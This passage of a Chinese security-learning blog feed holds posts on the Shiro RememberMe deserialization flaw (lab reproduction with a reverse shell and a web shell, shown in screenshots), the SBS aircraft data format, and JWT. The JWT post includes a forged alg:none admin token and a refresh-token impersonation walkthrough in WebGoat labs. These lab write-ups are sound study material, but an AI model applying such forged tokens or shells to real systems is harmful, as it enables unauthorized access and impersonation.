<strong>RememberMe</strong> Cookie 的值，然后进行 <strong>Base64</strong> 解码，接着使用 <strong>AES</strong> 解密，最后使用<strong>反序列化 Cookie <strong>值，当攻击者拿到</strong>默认的 AES 密钥</strong>的时候，可以自行构造恶意的 Cookie，从而导致反序列化漏洞的产生。</p><p><img src="/../image/image-20240330234050917.png" alt="image-20240330234050917"></p><p><img src="/../image/image-20240330234222679.png" alt="image-20240330234222679"></p><h4 id="4-3-3-漏洞复现"><a href="#4-3-3-漏洞复现" class="headerlink" title="4.3.3 漏洞复现"></a>4.3.3 漏洞复现</h4><p>靶场来源于：<a href="https://github.com/vulhub/vulhub/tree/master">vulhub</a></p><h5 id="4-3-3-1-利用工具"><a href="#4-3-3-1-利用工具" class="headerlink" title="4.3.3.1 利用工具"></a>4.3.3.1 利用工具</h5><ol><li><p>输入账号密码，点击remember me，进行抓包，查看回应发现是Shiro框架</p><p><img src="/../image/image-20240331003121402.png" alt="image-20240331003121402"></p><p><img src="/../image/image-20240331003219639.png" alt="image-20240331003219639"></p></li><li><p>使用<a href="https://github.com/SummerSec/ShiroAttack2/releases/tag/4.7.0">工具</a>进行探测，发现存在漏洞</p><p><img src="/../image/image-20240331003359224.png" alt="image-20240331003359224"></p></li><li><p>反弹shell</p><p><img src="/../image/image-20240331094938776.png" alt="image-20240331094938776"></p><p><img src="/../image/image-20240331094917859.png" alt="image-20240331094917859"></p></li><li><p>上传木马，使用蚁剑连接</p><p><img src="/../image/image-20240331095628190.png" alt="image-20240331095628190"></p><p><img src="/../image/image-20240331095601330.png" alt="image-20240331095601330"></p></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="https://blog.csdn.net/qq_61553520/article/details/130842975">https://blog.csdn.net/qq_61553520/article/details/130842975</a>“Java 反序列化漏洞”<br>[2]: <a href="https://blog.csdn.net/bobo_milk/article/details/128098492">https://blog.csdn.net/bobo_milk/article/details/128098492</a>“Web安全–反序列化漏洞（java篇）”<br>[3]: <a href="https://blog.csdn.net/weixin_42514777/article/details/114439492">https://blog.csdn.net/weixin_42514777/article/details/114439492</a>“java lang runtime_深入研究java.lang.Runtime类”<br>[4]: <a href="https://blog.csdn.net/chenthe1/article/details/131241341">https://blog.csdn.net/chenthe1/article/details/131241341</a>“ProcessBuilder类的介绍及使用”</p><p>[5]: <a href="https://cloud.tencent.com/developer/article/2288323">https://cloud.tencent.com/developer/article/2288323</a>“vulfocus搭建”</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SBS数据格式</title>
      <link href="/2024/03/03/sbs-shu-ju-ge-shi/"/>
      <url>/2024/03/03/sbs-shu-ju-ge-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h2><p>有六种消息类型 - MSG、SEL、ID、AIR、STA、CLK。来自飞机的大多数数据都包含在 MSG 行中，而其他类型则由用户输入或系统设置触发。</p><table><thead><tr><th><strong>ID</strong></th><th><strong>Type</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>SEL</strong></td><td><strong>选择更改消息</strong></td><td>当用户在基站中更改所选飞机时生成。</td></tr><tr><td><strong>ID</strong></td><td><strong>新的 ID 消息</strong></td><td>当被跟踪的飞机设置或更改其呼号时生成。</td></tr><tr><td><strong>AIR</strong></td><td><strong>新的飞机消息</strong></td><td>当 SBS 捕获到一个当前未被跟踪的飞机信号时生成。</td></tr><tr><td><strong>STA</strong></td><td><strong>状态变更消息</strong></td><td>根据数据设置菜单中的超时数值，当飞机的状态发生变化时生成。</td></tr><tr><td><strong>CLK</strong></td><td><strong>点击消息</strong></td><td>当用户双击（或按回车键）飞机时生成（即打开飞机详细信息窗口）。</td></tr><tr><td><strong>MSG</strong></td><td><strong>传输消息</strong></td><td>由飞机生成。共有八种不同的消息类型。</td></tr></tbody></table><p>来自飞机的传输消息 ( <strong>MSG</strong> ) 可能是八种类型之一：</p><table><thead><tr><th><strong>ID</strong></th><th><strong>Type</strong></th><th></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><strong>MSG,1</strong></td><td>**ES 身份识别和类别 **</td><td><strong>DF17 BDS 0,8</strong></td><td></td></tr><tr><td><strong>MSG,2</strong></td><td><strong>ES 地面位置消息</strong></td><td><strong>DF17 BDS 0,6</strong></td><td>由机头起落架压地开关触发。</td></tr><tr><td><strong>MSG,3</strong></td><td><strong>ES 空中位置消息</strong></td><td><strong>DF17 BDS 0,5</strong></td><td></td></tr><tr><td><strong>MSG,4</strong></td><td><strong>ES 空中速度消息</strong></td><td><strong>DF17 BDS 0,9</strong></td><td></td></tr><tr><td><strong>MSG,5</strong></td><td><strong>监视高度消息</strong></td><td><strong>DF4, DF20</strong></td><td>由地面雷达触发。未经 CRC 安全保护。如果飞机先前已发送过 MSG,1、2、3、4 或 8 信号，则只会输出 MSG,5。</td></tr><tr><td><strong>MSG,6</strong></td><td><strong>监视ID消息</strong></td><td><strong>DF5, DF21</strong></td><td>由地面雷达触发。未经 CRC 安全保护。如果飞机先前已发送过 MSG,1、2、3、4 或 8 信号，则只会输出 MSG,6。</td></tr><tr><td><strong>MSG,7</strong></td><td><strong>空对空消息</strong></td><td><strong>DF16</strong></td><td>由TCAS触发。MSG,7 现在包含在SBS套接字输出中。</td></tr><tr><td><strong>MSG,8</strong></td><td><strong>全呼应消息</strong></td><td><strong>DF11</strong></td><td>广播，但也可以由地面雷达触发</td></tr></tbody></table><h2 id="字段数据"><a href="#字段数据" class="headerlink" title="字段数据"></a>字段数据</h2><p>每种上述消息类型可能包含多达22个由逗号分隔的数据字段。这些字段如下：</p><table><thead><tr><th><strong>字段 1:</strong></th><th><strong>消息类型</strong></th><th>(MSG, STA, ID, AIR, SEL 或 CLK)</th></tr></thead><tbody><tr><td><strong>字段 2:</strong></td><td><strong>传输类型</strong></td><td>MSG 子类型 1 到 8。不被其他消息类型使用。</td></tr><tr><td><strong>字段 3:</strong></td><td><strong>会话 ID</strong></td><td>数据库会话记录编号</td></tr><tr><td><strong>字段 4:</strong></td><td><strong>飞机ID</strong></td><td>数据库飞机记录编号</td></tr><tr><td><strong>字段 5:</strong></td><td><strong>HexIdent</strong></td><td>飞机模式 S 十六进制代码</td></tr><tr><td><strong>字段 6:</strong></td><td><strong>航班ID</strong></td><td>数据库航班记录编号</td></tr><tr><td><strong>字段 7:</strong></td><td><strong>生成消息日期</strong></td><td>字面意思</td></tr><tr><td><strong>字段 8:</strong></td><td><strong>生成消息时间</strong></td><td>字面意思</td></tr><tr><td><strong>字段 9:</strong></td><td><strong>记录消息日期</strong></td><td>字面意思</td></tr><tr><td><strong>字段 10:</strong></td><td><strong>记录消息时间</strong></td><td>字面意思</td></tr></tbody></table><p>上述基本数据字段对所有消息来说都是标准的（字段 2 仅用于 MSG）。</p><p>下面的字段包含特定飞机信息。</p><table><thead><tr><th><strong>字段 11:</strong></th><th><strong>呼号</strong></th><th>一个八位数字的飞行 ID - 可以是航班号或注册号（甚至什么都没有）。</th></tr></thead><tbody><tr><td><strong>字段 12:</strong></td><td><strong>高度</strong></td><td>模式 C 高度。相对于 1013.2mb（飞行层）的高度。不是海平面以上高度。</td></tr><tr><td><strong>字段 13:</strong></td><td><strong>地速</strong></td><td>地面速度（不是指示空速）</td></tr><tr><td><strong>字段 14:</strong></td><td><strong>航迹</strong></td><td>飞机的航迹（不是航向）。由东西向速度和南北向速度派生而来</td></tr><tr><td><strong>字段 15:</strong></td><td><strong>纬度</strong></td><td>北纬和东经为正。南纬和西经为负。</td></tr><tr><td><strong>字段 16:</strong></td><td><strong>经度</strong></td><td>北纬和东经为正。南纬和西经为负。</td></tr><tr><td><strong>字段 17:</strong></td><td><strong>垂直速率</strong></td><td>64英尺分辨率</td></tr><tr><td><strong>字段 18:</strong></td><td><strong>应答器代码</strong></td><td>分配的模式 A 应答器代码。</td></tr><tr><td><strong>字段 19:</strong></td><td><strong>警报（应答器代码变化）</strong></td><td>标志表示应答器代码已更改。</td></tr><tr><td><strong>字段 20:</strong></td><td><strong>紧急</strong></td><td>标志表示已设置紧急代码</td></tr><tr><td><strong>字段 21:</strong></td><td><strong>SPI（标识）</strong></td><td>标志表示已激活应答器标识。</td></tr><tr><td><strong>字段 22:</strong></td><td><strong>是否在地面</strong></td><td>标志表示地面静压开关处于活动状态</td></tr></tbody></table><p>注（感谢 Edgy）：</p><p>套接字数据输出 -1 表示真，0 表示假。两者都表示它未被使用。</p><p>字段 11（呼号）是一个8字符（6位ASCII子集）字段。在基站中，NULL 显示为 ‘@’，这是 ASCII 中的 NULL。在驾驶舱中，它只是应答器窗口上的一个空格，但被发送为 NULL。因此，如果机组在驾驶舱中输入八个空格，这将在基站中显示为 @@@@@@@@。</p><p>字段 12（高度）可以是 25 英尺或 100 英尺分辨率。模式-C 是 100 英尺，但如今许多飞机发送 25 英尺分辨率，以便能够在欧洲的 IFR（RVSM）空域中飞行。BaseStation 仅显示气压高度，但数据中有 HAE（相对于椭球体的高度），这是通过发送 GPS 高度与气压高度之间的差值来表示的。</p><h2 id="消息内容"><a href="#消息内容" class="headerlink" title="消息内容"></a>消息内容</h2><p>每种消息类型包含不同的字段内容。在下表中，绿色表示发送的字段，灰色显示传输空数据的字段。MSG信号包含多达22个字段，而其他消息类型包含多达10个字段。</p><p><img src="/../image/image-20240303155719572.png" alt="image-20240303155719572"><br>注：</p><ol><li>STA 消息使用呼号字段记录基于用户超时值的状态标志。 值为 <strong>PL</strong>（位置丢失），<strong>SL</strong>（信号丢失），<strong>RM</strong>（删除），<strong>AD</strong>（删除）和 <strong>OK</strong>（如果飞机返回到覆盖区，则用于重置超时）。</li><li>CLK 消息在字段 4 和 6 中返回值 <strong>-1</strong>。字段 5 为空。</li><li>MSG,7（空对空消息）最近才包含在套接字输出中。</li><li>虽然飞机现在发送航向和真空速度，但这些值在套接字输出中不可用。</li></ol><p>从上表中您可以看到，MSG,1 消息仅发送前十一个字段的数据，其余的 11 个字段为空。这导致在此消息格式（以及其他 MSG 格式）中出现了很多逗号。</p><p>以下是每种消息的示例：</p><table><thead><tr><th>SEL,,496,2286,4CA4E5,27215,2010/02/19,18:06:07.710,2010/02/19,18:06:07.710,RYR1427</th></tr></thead><tbody><tr><td>ID,,496,7162,405637,27928,2010/02/19,18:06:07.115,2010/02/19,18:06:07.115,EZY691A</td></tr><tr><td>AIR,,496,5906,400F01,27931,2010/02/19,18:06:07.128,2010/02/19,18:06:07.128</td></tr><tr><td>STA,,5,179,400AE7,10103,2008/11/28,14:58:51.153,2008/11/28,14:58:51.153,RM</td></tr><tr><td>CLK,,496,-1,,-1,2010/02/19,18:18:19.036,2010/02/19,18:18:19.036</td></tr><tr><td>MSG,1,145,256,7404F2,11267,2008/11/28,23:48:18.611,2008/11/28,23:53:19.161,RJA1118,,,,,,,,,,,</td></tr><tr><td>MSG,2,496,603,400CB6,13168,2008/10/13,12:24:32.414,2008/10/13,12:28:52.074,,0,76.4,258.3,54.05735,-4.38826,,,,,,0</td></tr><tr><td>MSG,3,496,211,4CA2D6,10057,2008/11/28,14:53:50.594,2008/11/28,14:58:51.153,,37000,,,51.45735,-1.02826,,,0,0,0,0</td></tr><tr><td>MSG,4,496,469,4CA767,27854,2010/02/19,17:58:13.039,2010/02/19,17:58:13.368,,,288.6,103.2,,,-832,,,,,</td></tr><tr><td>MSG,5,496,329,394A65,27868,2010/02/19,17:58:12.644,2010/02/19,17:58:13.368,,10000,,,,,,,0,,0,0</td></tr><tr><td>MSG,6,496,237,4CA215,27864,2010/02/19,17:58:12.846,2010/02/19,17:58:13.368,,33325,,,,,,0271,0,0,0,0</td></tr><tr><td>MSG,7,496,742,51106E,27929,2011/03/06,07:57:36.523,2011/03/06,07:57:37.054,,3775,,,,,,,,,,0</td></tr><tr><td>MSG,8,496,194,405F4E,27884,2010/02/19,17:58:13.244,2010/02/19,17:58:13.368,,,,,,,,,,,,0</td></tr></tbody></table><h2 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h2><p>可以看到，没有单个的 MSG 类型提供我们在基站中使用的所有数据，而且某些数据字段是特定于某种消息类型的。呼号仅在 MSG,1 中找到，垂直速率仅在 MSG,4 中找到，而标识仅在 MSG,6 中找到。</p><p>要收集一个飞机的所有数据字段，至少需要接收四种 MSG 类型（MSG,1、MSG,3、MSG,4 和 MSG,6），但请注意 MSG,6 仅由地面雷达询问触发。如果飞机在任何地面雷达覆盖范围之外，将不会发送 MSG,6。由于 MSG,6 是唯一发送标识码的消息，这意味着仅在探测到处于 Mode S 地面雷达覆盖范围内的飞机的 SBS 用户才会显示此标识码。</p><p>同样，MSG,5 和 MSG,8 仅在询问时发送，但这些类型中的数据在其他消息中也可用。</p><p>MSG,5 和 MSG,6 未经 CRC 安全保护，只有在飞机已经发送过 MSG,1、2、3、4 或 8 的情况下才会收到。</p><h2 id="地面目标"><a href="#地面目标" class="headerlink" title="地面目标"></a>地面目标</h2><p>如果字段 22（IsOnGround）正在发送，则会触发字段 12（高度）和字段 15 和 16（纬度和经度）中的值的变化。字段 12（高度）将重置为零，并且只要飞机保持在地面上，就不会发送任何高度数据。</p><h2 id="位置准确性"><a href="#位置准确性" class="headerlink" title="位置准确性"></a>位置准确性</h2><p>ADS-B 中的紧凑位置报告使用 17 位发送纬度/经度数据，当在空中时，这可以达到 5.1 米的精度。17 位相当于纬度/经度值的四位小数 - 例如 N54.1234、W145.1234。对于地面操作，需要更高的位置准确性，因此纬度/经度值扩展到五位小数 - 例如 N54.12345、W145.12345 - 这可以达到 1.25 米的精度。</p><p>为了将此精度纳入 17 位字符串中，一些数据被丢弃 - 不再发送完整的纬度/经度位置数据。在基站中，用户需要通过基站位置管理器添加缺失的数据，这就是为什么只有在基站位置管理器中设置了位置时，纬度/经度值才会被正确解释。对于大多数用户，向位置管理器中添加一个家庭位置就足够了，但移动用户需要为可能访问的国外机场添加更多位置。我所说的国外是指洲际，因为基站现在可以将地面交通正确绘制到设置位置的范围内（以前只能到 90 海里）。</p><p>套接字数据始终显示纬度/经度数据到五位小数，并且可以提供完整的 1.25 米精度，如果有数据被发送的话。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]: <a href="http://woodair.net/SBS/Article/Barebones42_Socket_Data.htm">http://woodair.net/SBS/Article/Barebones42_Socket_Data.htm</a>“SBS BaseStation”</p>]]></content>
      
      
      
        <tags>
            
            <tag> 信安赛项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT Token</title>
      <link href="/2024/02/28/jwt-token/"/>
      <url>/2024/02/28/jwt-token/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><h3 id="1-什么是JSON-Web令牌"><a href="#1-什么是JSON-Web令牌" class="headerlink" title="1. 什么是JSON Web令牌"></a>1. 什么是JSON Web令牌</h3><p>JSON Web Token (JWT) 是一种开放标准 ( <a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a> )，它定义了一种紧凑且独立的方式，用于在各方之间以 JSON 对象的形式安全地传输信息。该信息可以被验证和信任，因为它是经过数字签名的。JWT 可以使用密钥（使用<strong>HMAC算法）或使用RSA</strong>或<strong>ECDSA</strong>的公钥/私钥对其进行签名。</p><p>认证过程：</p><p><img src="/../image/webp" alt="JWT的认证过程"></p><p>标头的内容应如下所示：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Authorization</span><span class="token punctuation">:</span> <span class="token header-value">Bearer &lt;token&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-JSON-Web令牌使用场景"><a href="#2-JSON-Web令牌使用场景" class="headerlink" title="2. JSON Web令牌使用场景"></a>2. JSON Web令牌使用场景</h3><ul><li><strong>授权</strong>：这是使用 JWT 最常见的场景。用户登录后，每个后续请求都将包含 JWT，从而允许用户访问该令牌允许的路由、服务和资源。单点登录是当今广泛使用 JWT 的一项功能，因为它的开销很小并且能够轻松地跨不同域使用。</li><li><strong>信息交换</strong>：JSON Web 令牌是在各方之间安全传输信息的好方法。因为 JWT 可以进行签名（例如，使用公钥/私钥对），所以可以确定发送者就是他们所说的人。此外，由于签名是使用标头和有效负载计算的，因此还可以验证内容是否未被篡改。</li></ul><h3 id="3-JSON-Web令牌的结构"><a href="#3-JSON-Web令牌的结构" class="headerlink" title="3. JSON Web令牌的结构"></a>3. JSON Web令牌的结构</h3><p>JSON Web 令牌由用点 (.)分隔的三个部分组成，它们是：</p><ul><li>标头</li><li>有效载荷</li><li>签名</li></ul><p>因此，JWT 通常如下所示。</p><pre class="line-numbers language-none"><code class="language-none">xxxxx.yyyyy.zzzzz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-1-标头"><a href="#3-1-标头" class="headerlink" title="3.1 标头"></a>3.1 标头</h4><p>标头通常由两部分组成：令牌的类型（JWT）和所使用的签名算法（例如 HMAC SHA256 或 RSA，可以为none）。</p><p>例如：</p><pre class="line-numbers language-none"><code class="language-none">{  "alg": "HS256",  "typ": "JWT"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后，对该 JSON 进行<strong>Base64Url</strong>编码以形成 JWT 的第一部分。</p><h4 id="3-2-有效载荷"><a href="#3-2-有效载荷" class="headerlink" title="3.2 有效载荷"></a>3.2 有效载荷</h4><p>有效载荷部分，是JWT的主体内容部分，其中包含声明，也是一个JSON对象。 JWT指定七个默认字段供选择。声明是关于实体（通常是用户）和附加数据的声明。申明分为三种类型：注册申明、公开申明和私人申明。</p><ul><li><a href="https://tools.ietf.org/html/rfc7519#section-4.1"><strong>注册声明</strong></a>：这些是一组预定义的声明，不是强制性的，而是推荐的，以提供一组有用的、可互操作的声明。其中一些是： <strong>iss</strong>（发行者）、 <strong>exp</strong>（到期时间）、 <strong>sub</strong>（主题）、 <strong>aud</strong>（受众）、<strong>nbf</strong>（在此之前不可用）、<strong>iat</strong>（发布时间）、<strong>jti</strong>（JWT ID用于标识该JWT）。</li><li><a href="https://tools.ietf.org/html/rfc7519#section-4.2"><strong>公开声明</strong></a>：这些可以由使用 JWT 的人随意定义。但为了避免冲突，它们应该在<a href="https://www.iana.org/assignments/jwt/jwt.xhtml">IANA JSON Web 令牌注册表</a>中定义，或者定义为包含防冲突命名空间的 URI。</li><li><a href="https://tools.ietf.org/html/rfc7519#section-4.3"><strong>私人声明</strong></a>：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公开声明。</li></ul><p>示例：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"sub"</span><span class="token operator">:</span> <span class="token string">"1234567890"</span><span class="token punctuation">,</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"John Doe"</span><span class="token punctuation">,</span>  <span class="token property">"admin"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下JWT是未加密的，任何人都可以解读其内容，因此不要构建隐私信息字段，存放保密信息，以防止信息泄露。</p><p>然后对有效负载进行<strong>Base64Url</strong>编码以形成 JSON Web 令牌的第二部分。</p><h4 id="3-3-签名"><a href="#3-3-签名" class="headerlink" title="3.3 签名"></a>3.3 签名</h4><p>签名哈希部分是对上面两部分数据签名，通过指定的算法生成哈希，以确保数据不会被篡改。</p><p>首先，需要指定一个密码（secret）。该密码仅仅为保存在服务器中，并且不能向用户公开。然后，使用标头中指定的签名算法（默认情况下为HMAC SHA256）根据以下公式生成签名。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">HMACSHA256</span><span class="token punctuation">(</span>  <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span>  <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>  secret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>签名用于验证消息在传输过程中没有发生更改，并且在使用私钥签名的令牌的情况下，它还可以验证 JWT 的发送者是否是其所说的人。</p><p>在计算出签名哈希后，JWT头，有效载荷和签名哈希的三个部分组合成一个字符串，每个部分用”.”分隔，就构成整个JWT对象。</p><h4 id="3-4-Base64URL算法"><a href="#3-4-Base64URL算法" class="headerlink" title="3.4 Base64URL算法"></a>3.4 Base64URL算法</h4><p>Base64URL与Base64的区别是在对字符串进行Base64编码之后把其中的’+’换成’-‘，把’/‘换成’_’，把结尾的’=’去掉</p><p>下面显示了一个 JWT，它具有先前的标头和有效负载编码，并且使用密钥进行签名。</p><p><img src="/../image/encoded-jwt3.png" alt="编码 JWT"></p><h2 id="二、JWT声明滥用"><a href="#二、JWT声明滥用" class="headerlink" title="二、JWT声明滥用"></a>二、JWT声明滥用</h2><p>JWT声明滥用指的是对JSON Web Token（JWT）中的声明进行不当或未经授权的操纵。JWT是一种紧凑且自包含的方式，用于在两方之间表示信息。它由头部、有效载荷（声明）和签名组成。</p><p>JWT声明滥用可以通过不同的方式发生：</p><ul><li><strong>未授权声明</strong>：恶意用户可能试图向JWT添加未授权的声明，以获取他们无权访问的特定功能或资源。例如，普通用户尝试修改他们的JWT以声称自己拥有管理员权限。</li><li><strong>篡改声明</strong>：攻击者可能试图修改JWT中现有声明的值，以操纵自己的身份或更改其权限。例如，更改”user_id”声明以冒充不同的用户。</li><li><strong>过多声明</strong>：攻击者可能试图在JWT中包含许多不必要或虚假的声明，以增加令牌的大小并可能破坏系统的性能或引起其他问题。</li><li><strong>过期或修改过期声明</strong>：如果攻击者能够修改”exp”声明以延长令牌的过期时间，他们可以有效地获得超出其预期会话的访问权限。</li><li><strong>重放攻击</strong>：攻击者可能试图重用旧会话中的有效JWT，以冒充原始用户或利用限时功能。</li><li><strong>关键声明操纵</strong>：在某些情况下，”kid”（密钥ID）声明可能会被滥用。攻击者可能试图操纵”kid”声明，使用不同的密钥进行签名验证。</li></ul><p>为了防止JWT声明滥用，实现客户端和服务器端的适当验证和验证机制至关重要。验证声明以确保它们是有效的、经过授权的，并且与用户的上下文相关。此外，始终验证JWT的签名以确保令牌的完整性并防止篡改。遵循JWT实施的最佳实践、安全的密钥管理和定期的密钥轮换也将有助于减轻JWT声明滥用的风险。</p><h3 id="1-alg-none漏洞"><a href="#1-alg-none漏洞" class="headerlink" title="1. alg:none漏洞"></a>1. alg:none漏洞</h3><p>由于头部的alg可以为none，也就是说签名的方式是空的，如果后端开启空加密的话，攻击者就可以随意改身份</p><p>在webgoat靶场中，一道题目要求获取管理员权限重置投票数</p><p><img src="/../image/Snipaste_2024-02-29_14-02-46.png"></p><p>切换用户点击重置投票数按钮后，抓包查看返回信息发现不行</p><p><img src="/../image/image-20240229140749980.png" alt="image-20240229140749980"></p><p>将抓到的包中的JWT信息放到<a href="https://jwt.io/#debugger-io">这个网站</a>查看信息</p><p><img src="/../image/image-20240229141134153.png" alt="image-20240229141134153"></p><p>我们可以尝试将admin的false改为ture，但是改了之后签名我们无法修改正确，但是因为alg的值是可以为none的，这时也就是不加密签名，签名的值就可以留空。我们就可以攻击成功，使用<a href="http://www.hiencode.com/base64.html">这个网站</a>对我们修改的内容进行编码</p><p>头部：{ “alg”: “none”}</p><p>Base64编码后为：eyJhbGciOiJub25lIn0=</p><p>有效载荷：{“iat”:1710050831,”admin”:”true”,”user”:”Jerry”}</p><p>Base64编码后为：eyJpYXQiOjE3MTAwNTA4MzEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9</p><p>将两部分Base64URL编码后合并再加第三部分为：eyJhbGciOiJub25lIn0.eyJpYXQiOjE3MTAwNTA4MzEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.</p><p><img src="/../image/image-20240229142837001.png" alt="image-20240229142837001"></p><h2 id="三、刷新令牌"><a href="#三、刷新令牌" class="headerlink" title="三、刷新令牌"></a>三、刷新令牌</h2><p>通常有两种类型的令牌：访问令牌和刷新令牌。访问令牌用于对服务器进行API调用。访问令牌的使用寿命有限，这就是刷新令牌的作用所在。一旦访问令牌不再有效，就可以向服务器请求通过提供刷新令牌来获得新的访问令牌。刷新令牌可能会过期，但其使用寿命要长得多。这解决了用户必须使用其凭据再次进行身份验证的问题。</p><p>服务器返回的格式可能如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"token_type"</span><span class="token operator">:</span><span class="token string">"bearer"</span><span class="token punctuation">,</span>    <span class="token property">"access_token"</span><span class="token operator">:</span><span class="token string">"XXXX.YYYY.ZZZZ"</span><span class="token punctuation">,</span>    <span class="token property">"expires_in"</span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">,</span>    <span class="token property">"refresh_token"</span><span class="token operator">:</span><span class="token string">"4a9a0b1eac1a34201b3c5659944e8b7"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>刷新令牌是一个随机字符串，服务器可以跟踪它（在内存或数据库中），以便将刷新令牌与授予刷新令牌的用户相匹配。因此，在这种情况下，无论何时访问令牌仍然有效，我们都可以称之为“无状态”会话，服务器端都没有设置用户会话的负担，令牌是自包含的。当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保该令牌不会以任何方式被阻止。</p><p>每当攻击者持有访问令牌时，该令牌仅在一定时间内有效（例如10分钟）。然后，攻击者需要刷新令牌来获取新的访问令牌。这就是为什么刷新令牌需要更好的保护。服务器完成所有验证后，必须向客户端返回一个新的刷新令牌和一个新访问令牌。客户端可以使用新的访问令牌来进行API调用。</p><p>无论选择何种解决方案，都应在服务器端存储足够的信息，以验证用户是否仍然可信。你可以考虑很多事情，比如存储ip地址，跟踪刷新令牌的使用次数（在访问令牌的有效时间窗口中多次使用刷新令牌可能表明有奇怪的行为，你可以撤销所有令牌，让用户再次进行身份验证）。还要跟踪哪个访问令牌属于哪个刷新令牌，否则攻击者可能会使用攻击者的刷新令牌为其他用户获取新的访问令牌。</p><p>下面是一个没有把刷新令牌和对应的访问令牌对应起来的例子：</p><p>实验要求我们以Tom的身份结账</p><p><img src="/../image/Snipaste_2024-03-01_15-57-29.png"></p><p>查看日志可以发现Tom以前使用过的访问令牌，同时我们知道Jerry的账号和密码，可以重新登录获取刷新令牌</p><p><img src="/../image/image-20240301155958601.png" alt="image-20240301155958601"></p><p><img src="/../image/image-20240301160109799.png" alt="image-20240301160109799"></p><p>将过期的Tom的访问令牌和Jerry的新的刷新令牌结合获取新的访问令牌</p><p><img src="/../image/image-20240301160323385.png" alt="image-20240301160323385"></p><p>最后再以Tom的访问令牌购买商品</p><p><img src="/../image/image-20240301160459466.png" alt="image-20240301160459466"></p><h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><p>[1]: <a href="https://jwt.io/introduction">https://jwt.io/introduction</a>“Introduction to JSON Web Tokens”<br>[2]: <a href="https://www.jianshu.com/p/d1644e281250">https://www.jianshu.com/p/d1644e281250</a>“JWT全面解读、详细使用步骤”</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本人搭建个人博客过程及遇到的问题</title>
      <link href="/2024/01/24/ben-ren-da-jian-ge-ren-bo-ke-guo-cheng-ji-yu-dao-de-wen-ti/"/>
      <url>/2024/01/24/ben-ren-da-jian-ge-ren-bo-ke-guo-cheng-ji-yu-dao-de-wen-ti/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>我在搭建这个博客时，前前后后花费了近一天的时间，中间还放弃了一次，其中遇到了许多问题，所以写下这篇文章来记录一下。</p><h2 id="二、准备工作"><a href="#二、准备工作" class="headerlink" title="二、准备工作"></a>二、准备工作</h2><p><strong>Git <a href="https://git-scm.com/downloads">官网</a></strong><br><strong>Hexo <a href="https://hexo.io/zh-cn/">官网</a></strong><br><strong>Node.js <a href="https://nodejs.org/zh-cn/">官网</a></strong><br><strong>Github <a href="https://github.com/">官网</a></strong><br><strong>域名(可选)</strong></p><h2 id="三、博客环境搭建"><a href="#三、博客环境搭建" class="headerlink" title="三、博客环境搭建"></a>三、博客环境搭建</h2><h3 id="1-安装Git和Node-js"><a href="#1-安装Git和Node-js" class="headerlink" title="1. 安装Git和Node.js"></a>1. 安装Git和Node.js</h3><p>可以参考如下文章</p><p><strong><a href="https://zhuanlan.zhihu.com/p/137448719">Git安装教程</a></strong><br><strong><a href="https://zhuanlan.zhihu.com/p/137445273">Nodejs安装</a></strong></p><h3 id="2-安装Hexo"><a href="#2-安装Hexo" class="headerlink" title="2. 安装Hexo"></a>2. 安装Hexo</h3><ol><li><p>在你的博客存放目录下右击鼠标，选择<strong>Open Git Bash here</strong>,打开Git命令行</p><p><img src="/../image/image-20240124221659266.png" alt="image-20240124221659266"></p><p><img src="/../image/image-20240124221844205.png" alt="image-20240124221844205"></p></li><li><p>输入以下命令下载Hexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-cli 